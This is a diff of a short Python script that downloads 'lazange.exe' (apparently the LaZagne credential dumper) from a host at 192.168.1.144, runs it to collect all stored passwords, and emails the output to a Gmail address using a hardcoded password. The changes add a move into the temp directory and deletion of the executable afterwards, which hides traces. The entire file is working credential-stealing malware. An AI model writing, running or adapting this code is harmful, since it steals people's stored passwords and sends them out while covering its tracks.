@@ -1,4 +1,4 @@
-import smtplib, requests, subprocess
+import smtplib, requests, subprocess, os, tempfile
 
 
 def download(url):
@@ -16,6 +16,9 @@ def send_mail(email, password, message):
 	server.sendmail(email, email, message) #from, to, message
 	server.quit()
 
+temp_directory = tempfile.gettempdir()
+os.chdir(temp_directory) # change working directory to temp directory
 download("http://192.168.1.144/evil-files/lazange.exe")
 result = subprocess.check_output("lazange.exe all", shell=True)
 send_mail("coolandunusualtestserver@gmail.com", "bepis123!", result)
+os.remove("lazange.exe")
